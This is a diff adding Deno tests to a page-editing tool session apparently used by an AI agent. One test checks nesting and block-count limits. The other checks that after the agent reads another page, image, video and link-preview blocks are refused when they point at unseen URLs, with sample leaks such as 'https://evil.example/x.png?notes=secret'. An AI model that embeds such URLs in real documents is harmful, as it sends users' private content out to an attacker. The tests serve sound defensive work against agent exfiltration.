@@ -1,8 +1,11 @@
 import { assert, assertEquals } from "jsr:@std/assert@1";
 import {
+  type BlockSpec,
   deltaToMarkdown,
   isPageContent,
   markdownToDelta,
+  MAX_SPEC_DEPTH,
+  MAX_SPEC_NODES,
   type NodeJSON,
   type PageContent,
   pageViews,
@@ -411,4 +414,89 @@ Deno.test("stored content is a page's only with its document, of a known version
     isPageContent({ document: { id: "root", type: "page", children: [] }, meta: { v: 1, blocks: {}, deleted: {} } }),
   );
   assert(isPageContent({ document: { children: [] } }));
+});
+
+Deno.test("specs nest only so deep, and make only so many blocks per call", async () => {
+  let n = 0;
+  const nested = (depth: number): BlockSpec => {
+    let spec: BlockSpec = { type: "bulleted_list", text: "leaf" };
+    for (let i = 1; i < depth; i++) spec = { type: "bulleted_list", text: `level ${i}`, children: [spec] };
+    return spec;
+  };
+  specToNode(nested(MAX_SPEC_DEPTH), { newId: () => `id${n++}` });
+  let threw = false;
+  try {
+    specToNode(nested(MAX_SPEC_DEPTH + 1), { newId: () => `id${n++}` });
+  } catch {
+    threw = true;
+  }
+  assert(threw, "a spec nested too deep was made");
+  threw = false;
+  try {
+    specToNode({ type: "bulleted_list", text: "x", children: "nope" as unknown as BlockSpec[] }, { newId: () => "x" });
+  } catch {
+    threw = true;
+  }
+  assert(threw, "children that are not an array were taken");
+
+  // Within the 200 top-level blocks a call takes, nested ones count too.
+  const wide: BlockSpec = {
+    type: "bulleted_list",
+    text: "x",
+    children: Array.from({ length: Math.ceil(MAX_SPEC_NODES / 100) }, () => ({ type: "bulleted_list", text: "y" })),
+  };
+  const session = new PageEditSession(sample(), hooks, { canEdit: true, crossPage: false });
+  const outcome = await session.call("insert_blocks", { position: { at: "end" }, blocks: Array(100).fill(wide) });
+  assert((outcome.result as { error?: string }).error?.includes("in all"), JSON.stringify(outcome.result));
+  assertEquals(outcome.ops, []);
+  assertEquals(shape(session.content), shape(sample()));
+});
+
+Deno.test("after reading another page, blocks that load a URL use only one seen", async () => {
+  const content = sample();
+  content.document.children!.push({ id: "img", type: "image", data: { url: "https://example.com/here.png" } });
+  const reading: ToolHooks = {
+    ...hooks,
+    readOtherPage: () =>
+      Promise.resolve({ blocks: [{ id: "x", type: "paragraph", text: "see https://example.com/there.png for it" }] }),
+  };
+  const session = new PageEditSession(content, reading, { canEdit: true, crossPage: true });
+  const image = (url: string) => ({ type: "image", image: { url } });
+  const end = { at: "end" };
+  // Before reading another page, any URL goes.
+  let outcome = await session.call("insert_blocks", { position: end, blocks: [image("https://a.example/1.png")] });
+  assert(!(outcome.result as { error?: string }).error, JSON.stringify(outcome.result));
+
+  await session.call("read_other_page", { page_id: "page-9" });
+  for (const url of ["https://example.com/here.png", "https://example.com/there.png", "https://a.example/1.png"]) {
+    outcome = await session.call("insert_blocks", { position: end, blocks: [image(url)] });
+    assert(!(outcome.result as { error?: string }).error, `${url}: ${JSON.stringify(outcome.result)}`);
+  }
+  const leaks: [string, Record<string, unknown>][] = [
+    ["insert_blocks", { position: end, blocks: [image("https://evil.example/x.png?notes=secret")] }],
+    ["insert_blocks", {
+      position: end,
+      blocks: [{
+        type: "bulleted_list",
+        text: "x",
+        children: [{ type: "link_preview", link: { url: "https://evil.example/" } }],
+      }],
+    }],
+    ["replace_block", { id: "img", block: { type: "video", video: { url: "https://evil.example/v.mp4" } } }],
+    ["create_subpage", { title: "Notes", blocks: [image("https://evil.example/y.png")] }],
+  ];
+  for (const [name, args] of leaks) {
+    const before = structuredClone(shape(session.content));
+    outcome = await session.call(name, args);
+    const error = (outcome.result as { error?: string }).error;
+    assert(error?.includes("Link to it in text instead"), JSON.stringify(outcome.result));
+    assertEquals(outcome.ops, []);
+    assertEquals(shape(session.content), before);
+  }
+  // Links in text stay free.
+  outcome = await session.call("insert_blocks", {
+    position: end,
+    blocks: [{ type: "paragraph", text: "[x](https://evil.example/)" }],
+  });
+  assert(!(outcome.result as { error?: string }).error, JSON.stringify(outcome.result));
 });
